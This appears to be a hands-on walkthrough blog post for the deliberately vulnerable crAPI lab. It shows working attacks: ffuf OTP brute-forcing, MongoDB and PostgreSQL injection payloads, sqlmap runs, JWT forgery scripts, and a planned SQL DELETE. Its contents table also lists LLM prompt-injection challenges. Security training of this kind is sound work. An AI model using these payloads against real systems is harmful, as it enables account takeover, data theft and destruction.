## Overview

crAPI (Completely Ridiculous API) is an intentionally vulnerable application built around the OWASP API Top 10. I worked through each challenge hands-on to build out a portfolio of API attack chains and document the reasoning behind every step. The whole stack runs locally in Docker.

![](/assets/images/crapi/Pasted%20image%2020260507234134.png)

## Tools

| Tool | Purpose |
|------|---------|
| **Postman** | Structured API testing with collection variables |
| **Burp Suite / Caido** | Caido on the host (CachyOS), Burp inside a Kali VM |
| **Mailhog** | Local mail capture at `http://localhost:8025/` |
| **ffuf** | Fast wordlist-based fuzzing |

## Table of Contents

The walkthrough opens with [recon and Postman setup](#application-walkthrough), then works through the challenges grouped by OWASP API category:

| Category | Challenges | Key Attack |
|----------|------------|------------|
| BOLA | 1, 2 | Cross-user resource access via GUIDs leaked in community posts |
| Broken User Authentication | 3 | 4-digit OTP bruteforce against unrate-limited legacy `v2` endpoint |
| Excessive Data Exposure | 4, 5 | Hidden author and video metadata in raw API responses |
| Rate Limiting | 6 | Self-amplifying request loop via user-controlled repeat count |
| BFLA | 7 | Admin video-delete endpoint reachable by any authenticated user |
| Mass Assignment | 8, 9, 10 | Order status manipulation, refund abuse, internal video properties |
| SSRF | 11 | Unvalidated `mechanic_api` URL passed to server-side HTTP client |
| NoSQL Injection | 12 | MongoDB `$ne` operator object bypasses coupon lookup |
| SQL Injection | 13 | PostgreSQL stacked queries on `apply_coupon` |
| Unauthenticated Access | 14 | Hunting for endpoints that skip JWT validation |
| JWT Vulnerabilities | 15 | `alg:none` and RS256 → HS256 algorithm confusion |
| LLM Vulnerabilities | 16, 17, 18 | Prompt injection, credential exfiltration, user impersonation |

<summary><strong>Recon Approach</strong></summary>


I always start by registering an account and walking the full user journey before I touch a single attack tool. Vehicle registration, dashboard, community forums, mechanic reports, the shop. Rather than hunting for bugs straight away, I'm building a mental model of how the app fits together: what each feature is for, how data flows, and what the object relationships look like between users. Burp captures everything in the background, so by the time I'm done clicking around I've got a complete endpoint map to work from.

Once I have the lay of the land, I start asking the design questions. How does the app differentiate user resources? Where do role checks live? Is validation happening on the frontend or the backend? Those answers usually point me at the soft spots.

## Challenges

<details markdown="1">
<summary><strong>BOLA</strong></summary>


<details markdown="1">
<summary><strong>Challenge 1 — Access Details of Another User's Vehicle</strong> ✅</summary>


> **Objective.** Leak sensitive information about another user's vehicle. Vehicle IDs are GUIDs rather than sequential integers, so step one is finding a way to harvest a target ID.
{: .prompt-info }

**Reconnaissance**

`GET /community/api/v2/community/posts/recent` returns post metadata that includes each author's `vehicleid`, a GUID the UI never shows. Clicking into Adam's post reveals:

```json
[
  {
    "id": "AwFipwgZ8sMsnxgb5uxNnD",
    "title": "Title 1",
    "content": "Hello world 1",
    "author": {
      "nickname": "Adam",
      "email": "adam007@example.com",
      "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378",
      "profile_pic_url": "",
      "created_at": "2026-04-24T02:06:56.672Z"
    },
    "comments": [],
    "authorid": 1,
    "CreatedAt": "2026-04-24T02:06:56.672Z"
  }
]
```

![](/assets/images/crapi/Pasted%20image%2020260506154802.png)

**Exploitation**

**1.** I pulled Adam's vehicle GUID: `f89b5f21-7829-45cb-a650-299a61090378`.

**2.** Substituted it into the vehicle location endpoint in place of my own vehicle ID:

```
GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location
Authorization: Bearer {{jwt-user1}}
```

**3.** The response handed me Adam's GPS coordinates back with no ownership check.

![](/assets/images/crapi/Pasted%20image%2020260506161217.png)
![](/assets/images/crapi/Pasted%20image%2020260506161414.png)

> **Finding.** `GET /identity/api/v2/vehicle/{vehicleId}/location` performs no ownership validation. Any authenticated user can pull the location of any vehicle if they know the GUID, and vehicle IDs leak in bulk via the community posts API. That makes this a complete BOLA chain with zero guesswork.
{: .prompt-danger }

</details>

<summary><strong>Challenge 2 — Access Mechanic Reports of Other Users</strong> ✅</summary>


> **Objective.** Access mechanic service reports submitted by other users.
{: .prompt-info }

**Reconnaissance**

The contact mechanic flow issues two requests:

**1.** `GET /workshop/api/mechanic/` returns available mechanics with their email, ID, and mechanic code

**2.** `POST /workshop/api/mechanic/contact_mechanic` submits the service request

The `POST` response includes a direct link to the created report with a visibly sequential `report_id`:

```json
{
  "response_from_mechanic_api": {
    "id": 9,
    "sent": true,
    "report_link": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=9"

  "status": 200
}
```

![](/assets/images/crapi/Pasted%20image%2020260506162100.png)
![](/assets/images/crapi/Pasted%20image%2020260506162451.png)

**Exploitation**

**1.** I requested the report link with a valid `Authorization` header and got the full report back:

```
GET /workshop/api/mechanic/mechanic_report?report_id=9
Authorization: Bearer {{jwt-user1}}
```

```json
{
  "id": 9,
  "mechanic": {
    "id": 1,
    "mechanic_code": "TRAC_JHN",
    "user": { "email": "jhon@example.com", "number": "" }
  },
  "vehicle": {
    "id": 52,
    "vin": "18J58YX004V1G70L0",
    "owner": { "email": "test@gmail.com", "number": "1114441444" }
  },
  "problem_details": "No gas :(",
  "status": "pending",
  "created_on": "06 May, 2026, 20:21:14",
  "updated_on": null,
  "comments": []
}
```

**2.** With sequential IDs in play, I sent the request to Burp Intruder with a numeric payload (0 to 20). IDs 1 through 9 all came back `200 OK`, IDs 10+ returned `400`.

![](/assets/images/crapi/Pasted%20image%2020260506171624.png)
![](/assets/images/crapi/Pasted%20image%2020260506172012.png)

> **Finding.** `GET /workshop/api/mechanic/mechanic_report?report_id={id}` performs no ownership check. The `report_id` is a sequential integer that's exposed directly in the API response, which makes full enumeration trivial with Burp Intruder.
{: .prompt-danger }

</details>

<details markdown="1">
<summary><strong>Broken User Authentication</strong></summary>


<details markdown="1">
<summary><strong>Challenge 3 — Reset the Password of a Different User</strong> ✅</summary>


> **Objective.** Reset another user's password without knowing their current credentials.
{: .prompt-info }

**Reconnaissance**

I walked the authenticated password reset flow first:

- `POST /identity/api/v2/user/reset-password` accepts a new password alongside the requesting user's JWT
- Response: `{"message": "Password reset successful."}`

That endpoint is gated by my own JWT and only resets my own password, so it's a dead end for cross-user attacks. The real target is the **unauthenticated forgot-password flow**.

From Challenge 1 I already had Adam's email (`adam007@example.com`) leaked through community post metadata.

**Exploitation**

**1.** I signed out and selected **Forgot Password**, submitting Adam's email.

![](/assets/images/crapi/Pasted%20image%2020260506173220.png)

**2.** Triggered the same flow against my own account and checked Mailhog. The OTP is a **4-digit PIN**, so 10,000 possible values total.

![](/assets/images/crapi/Pasted%20image%2020260506173634.png)

**3.** Entered a dummy OTP and a desired new password, then intercepted the submission. The verification endpoint is `POST /identity/api/auth/v3/check-otp`.

![](/assets/images/crapi/Pasted%20image%2020260506173758.png)

**4.** Sent it to Burp Intruder with a payload range of `0000` to `9999` on the `otp` field (min integer digits = 4). The `v3` endpoint returned `503` rate-limit responses on every attempt.

![](/assets/images/crapi/Pasted%20image%2020260506174141.png)

**5.** Switched to `/identity/api/auth/v2/check-otp`. The older version applies no rate limiting at all. I filtered out `5xx` responses and ran the same payload list to find the one `200`.

![](/assets/images/crapi/Pasted%20image%2020260506174414.png)
![](/assets/images/crapi/Pasted%20image%2020260506174543.png)

**6.** Burp Community throttles Intruder, so I switched to `ffuf` for the actual bruteforce. Generated the wordlist:

```bash
seq -w 0000 9999 > otp_list.txt
```

**7.** Ran the bruteforce, filtering out invalid OTP responses:

```bash
ffuf \
  -w otp_list.txt:FUZZ \
  -u http://localhost:8888/identity/api/auth/v2/check-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"adam007@example.com","otp":"FUZZ","password":"Testerone!1"}' \
  -fr "Invalid OTP" \
  -t 50
```

![](/assets/images/crapi/Pasted%20image%2020260506193343.png)

**8.** Valid OTP found: `3952`.

![](/assets/images/crapi/Pasted%20image%2020260506194004.png)

**9.** Submitted `3952` as the OTP and the password reset went through.

![](/assets/images/crapi/Pasted%20image%2020260506194031.png)

> **Finding.** `POST /identity/api/auth/v3/check-otp` rate-limits OTP bruteforce, but the older `v2` endpoint has no such control. Any user's password can be reset by enumerating a 4-digit OTP against the unprotected legacy endpoint. Classic API versioning oversight.
{: .prompt-danger }

</details>

</details>

<summary><strong>Rate Limiting</strong></summary>


<details markdown="1">
<summary><strong>Challenge 6 — Perform a Layer 7 DoS Using the "Contact Mechanic" Feature</strong> ✅</summary>


> **Objective.** Abuse the contact mechanic feature to trigger a denial of service against an endpoint that has no rate limiting.
{: .prompt-info }

**Reconnaissance**

Submitting a mechanic request sends a `POST` to `/workshop/api/mechanic/contact_mechanic`. The body has two parameters worth a closer look:

```json
{
  "mechanic_code": "TRAC_JME",
  "problem_details": "I need gas",
  "vin": "1CSFH1A1W3VU6PR48",
  "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

**Exploitation**

**1.** Sent the request to Repeater.

**2.** Set `repeat_request_if_failed` to `true` and `number_of_repeats` to `600`:

```json
{
  "mechanic_code": "TRAC_JME",
  "problem_details": "I need gas",
  "vin": "1CSFH1A1W3VU6PR48",
  "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": true,
  "number_of_repeats": 600
}
```

![](/assets/images/crapi/Pasted%20image%2020260506195628.png)

> **Finding.** `number_of_repeats` and `repeat_request_if_failed` are both user-controlled with no server-side cap. A high repeat count makes the server flood itself with internal requests, and that's enough for a Layer 7 DoS off a single API call.
{: .prompt-danger }

</details>

</details>

<details markdown="1">
<summary><strong>BFLA</strong></summary>


<details markdown="1">
<summary><strong>Challenge 7 — Delete a Video of Another User</strong> ✅</summary>


> **Objective.** Use REST predictability to find an admin endpoint for deleting videos, then use it to delete another user's video.
{: .prompt-info }

**Reconnaissance**

After uploading a video, the page issues `GET /identity/api/v2/user/videos/52`. Sequential integer video ID, immediately suspicious.

**Exploitation**

**1.** I logged in as User 2 and uploaded a video. The response confirmed sequential IDs: the new video came back as `id: 53`.

![](/assets/images/crapi/Pasted%20image%2020260506223907.png)
![](/assets/images/crapi/Pasted%20image%2020260506224041.png)

**2.** Sent the `GET /identity/api/v2/user/videos/53` request to Repeater and changed the method to `DELETE`. Got a `403`:

```json
{"message": "This is an admin function. Try to access the admin API", "status": 403}
```

**3.** The error message basically hints at the next endpoint to try. A quick check against the Postman schema confirmed it:

```
DELETE /identity/api/v2/admin/videos/:video_id
```

![](/assets/images/crapi/Pasted%20image%2020260506224425.png)

**4.** Deleted User 2's video using the admin endpoint, authenticated as User 1:

```
DELETE /identity/api/v2/admin/videos/53
Authorization: Bearer {{jwt-user1}}
```

```json
{"message": "User video deleted successfully.", "status": 200}
```

**5.** Confirmed cross-user deletion is reproducible by deleting User 1's own video with the same endpoint:

```
DELETE /identity/api/v2/admin/videos/52
Authorization: Bearer {{jwt-user1}}
```

```json
{"message": "User video deleted successfully.", "status": 200}
```

> **Finding.** `DELETE /identity/api/v2/admin/videos/{id}` is reachable by any authenticated user. There's no admin role check enforced server-side. Combine that with sequential video IDs that leak in standard responses and cross-user deletion is essentially free.
{: .prompt-danger }

</details>

</details>

<details markdown="1">
<summary><strong>Challenge 12 — Get Free Coupons Without Knowing the Coupon Code</strong> ✅</summary>


> **Objective.** Apply a coupon discount without knowing any valid coupon code.
{: .prompt-info }

**Reconnaissance**

Intercepting a coupon submission shows a `POST` to `/community/api/v2/coupon/validate-coupon` with the code in the JSON body.

![](/assets/images/crapi/Pasted%20image%2020260507201138.png)

**Exploitation**

**1.** I replaced the `coupon_code` string value with a MongoDB `$ne` operator object. The `$ne` operator matches any coupon where the code is not equal to `"invalid"`, which is every real coupon in the DB:

```json
{"coupon_code": {"$ne": "invalid"}}
```

![](/assets/images/crapi/Pasted%20image%2020260507201607.png)

**2.** Alternative payload using `$ne` against `null`:

```json
{"coupon_code": {"$ne": "null"}}
```

![](/assets/images/crapi/Pasted%20image%2020260507201810.png)

> **Finding.** `POST /community/api/v2/coupon/validate-coupon` passes the request body straight into a MongoDB query without type-checking. Replacing the coupon code string with an operator object bypasses the lookup entirely. Any MongoDB comparison operator (`$ne`, `$gt`, `$regex`) will match a valid coupon. The fix is to validate that `coupon_code` is a string before querying.
{: .prompt-danger }

<details markdown="1">
<summary><strong>Challenge 13 — Redeem a Coupon You Have Already Claimed</strong> 🔄</summary>


> **Objective.** Redeem a coupon that's already been used against my account.
{: .prompt-info }

**Reconnaissance**

Applying a coupon triggers two sequential requests:

**1.** `POST /community/api/v2/coupon/validate-coupon` validates the coupon code (this is the MongoDB endpoint from Challenge 12)

**2.** `POST /workshop/api/shop/apply_coupon` applies the discount

Once a coupon has been claimed, re-submitting the same code returns `400`:

```json
{"message": "TRAC075 Coupon code is already claimed by you!! Please try with another coupon code"}
```

![](/assets/images/crapi/Pasted%20image%2020260507202205.png)

**Exploitation**

The SQL injection target here is `apply_coupon`, not `validate-coupon`. The `validate-coupon` endpoint is the Mongo one I already used in Challenge 12, while `apply_coupon` lives on the workshop service and is backed by PostgreSQL.

The backend query is most likely something like:

```sql
SELECT * FROM coupons WHERE coupon_code = 'INPUT' AND used_by IS NULL
```

**1.** I tested for SQL injection by appending a single quote to the coupon code:

```json
{"coupon_code": "TRAC075'"}
```

A `500` or SQL error response is enough to confirm the endpoint is injectable.

**2.** My first instinct was to comment out the `AND used_by IS NULL` condition with a SQL comment:

```json
{"coupon_code": "TRAC075'-- -"}
```

That should rewrite the query to:

```sql
SELECT * FROM coupons WHERE coupon_code = 'TRAC075'-- -' AND used_by IS NULL
```

The `-- -` comments out the used-check so the already-claimed coupon validates as available.

**3.** The `' OR '1'='1'--` payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) didn't work either. A few other manual variations also came up empty, so I stopped guessing and brought in sqlmap.

I saved the apply-coupon request from Burp as `apply-coupon-request.txt` and threw sqlmap at it:

```bash
sqlmap -r apply-coupon-request.txt --batch
```

![](/assets/images/crapi/Pasted%20image%2020260508003932.png)

sqlmap confirmed the backend is **PostgreSQL behind OpenResty 1.27** and identified four working injection types:

```
[00:36:57] [INFO] (custom) POST parameter 'JSON coupon_code' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

Parameter: JSON coupon_code ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"coupon_code":"TRAC075' AND 7765=7765 AND 'isfJ'='isfJ","amount":75}

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: {"coupon_code":"TRAC075';SELECT PG_SLEEP(5)--","amount":75}

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: {"coupon_code":"TRAC075' AND 3191=(SELECT 3191 FROM PG_SLEEP(5)) AND 'nSfJ'='nSfJ","amount":75}

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: {"coupon_code":"-8408' UNION ALL SELECT (CHR(113)||...","amount":75}
```

To double-check the time-based oracle by hand, I sent a stacked query with a 15-second sleep:

```
TRAC075';SELECT PG_SLEEP(15)--
```

Postman hung for exactly 15 seconds before returning, which confirms blind injection via stacked queries:

![](/assets/images/crapi/Pasted%20image%2020260508004757.png)

> **In progress.** Next step is using the stacked-query primitive to delete the row that records my claim, then resubmitting the coupon normally. Plan: dump the schema with `sqlmap -r apply-coupon-request.txt --batch --dbs --tables`, find the applied-coupons table, then drop my row with `sqlmap --sql-shell` and a `DELETE FROM applied_coupon WHERE coupon_code='TRAC075'`.
{: .prompt-tip }

<details markdown="1">
<summary><strong>Challenge 15 — Forge Valid JWT Tokens</strong> ✅</summary>


> **Objective.** crAPI's JWT auth is vulnerable to multiple attack classes. The challenge is to land any one method to forge a valid token and gain full platform access.
{: .prompt-info }

**Reconnaissance**

I grabbed a real JWT first by logging in:

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"Tester1@gmail.com","password":"Testerone1!"}'
```

Response:
```json
{"token":"eyJhbGciOiJSUzI1NiJ9...","type":"Bearer"}
```

Decoded it with jwt-hack to see the structure:

```bash
jwt-hack decode <token>
```

Header: `{"alg":"RS256"}`. Asymmetric RSA signing.
Payload: `{"sub":"Tester1@gmail.com","iat":...,"exp":...,"role":"user"}`

Scanned for known vulnerability classes:

```bash
jwt-hack scan <token>
```

Two high-severity findings came back:

**1.** **`alg:none`** suggests the server may accept unsigned tokens

**2.** **Algorithm confusion (RS256 → HS256)** suggests the server may accept HS256 tokens signed with the RSA public key

The RSA public key is publicly exposed at:

```
GET /.well-known/jwks.json
```

```json
{
  "keys": [{
    "kty": "RSA", "alg": "RS256",
    "n": "sZKrGYja9S7BkO-waOcu...",
    "e": "AQAB",
    "kid": "MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8"
  }]
}
```

---

**Attack 1 — `alg:none` (unsigned token)**

> **How it works.** Change the `alg` header to `none` and drop the signature. A vulnerable server skips signature verification entirely for this algorithm.
{: .prompt-info }

I generated all `none` variants with jwt-hack:

```bash
jwt-hack payload <token> --target none
```

The trick is the trailing dot. `header.payload.` is the correct format for `alg:none` (empty signature part):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.
```

To forge a token for any user (in this case `adam007@example.com`), I built the payload by hand:

```python
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "adam007@example.com", "iat": 1778209232, "exp": 9999999999, "role": "user"}

h = b64url(json.dumps(header, separators=(',', ':')))
p = b64url(json.dumps(payload, separators=(',', ':')))
token = f"{h}.{p}."
print(token)
```

Test:

```bash
curl -s -H "Authorization: Bearer <forged_token>" \
  http://localhost:8888/identity/api/v2/user/dashboard
```

Result: **HTTP 200**. Adam's full profile came back.

> **Key detail.** Only `alg:none` (lowercase) with a trailing dot worked. `NonE` and `NONE` returned `404` because the Spring JWT library rejects those spellings, but it was misconfigured to accept the lowercase exact string.
{: .prompt-warning }

---

**Attack 2 — RS256 → HS256 Algorithm Confusion**

> **How it works.** When a server uses RS256, it verifies with the RSA public key. If an attacker sends a token with `alg:HS256`, a naive implementation reuses "the key" (the same RSA public key bytes) as the HMAC secret. Since the public key is known, the attacker can compute a valid HMAC signature.
{: .prompt-info }

Step 1: extract and convert the public key from JWKS to PEM:

```python
from Cryptodome.PublicKey import RSA
import base64

def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

n = int.from_bytes(b64url_decode("sZKrGYja9S7BkO-waOcu..."), 'big')
e = int.from_bytes(b64url_decode("AQAB"), 'big')
pem = RSA.construct((n, e)).export_key('PEM')
```

Step 2: sign a forged HS256 JWT using the PEM bytes as the HMAC-SHA256 secret:

```python
import hmac, hashlib

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "adam007@example.com", "iat": 1778209232, "exp": 9999999999, "role": "user"}

h = b64url_encode(json.dumps(header, separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))
signing_input = f"{h}.{p}".encode()

sig = hmac.new(pem, signing_input, hashlib.sha256).digest()
token = f"{h}.{p}.{b64url_encode(sig)}"
```

Test:

```bash
curl -s -H "Authorization: Bearer <forged_hs256_token>" \
  http://localhost:8888/identity/api/v2/user/dashboard
```

Result: **HTTP 200**. Adam's profile, same as Attack 1.

> **Finding.** crAPI's JWT implementation is vulnerable to two independent attack classes:
> 1. `alg:none` is accepted without signature verification
> 2. RS256 → HS256 algorithm confusion lets the server's RSA public key (exposed via `/.well-known/jwks.json`) double as the HMAC secret, producing a verifiable HS256 signature
>
> Either attack lets me forge arbitrary tokens for any registered user with any role claim, and that's full platform impersonation with no knowledge of the private key.
{: .prompt-danger }
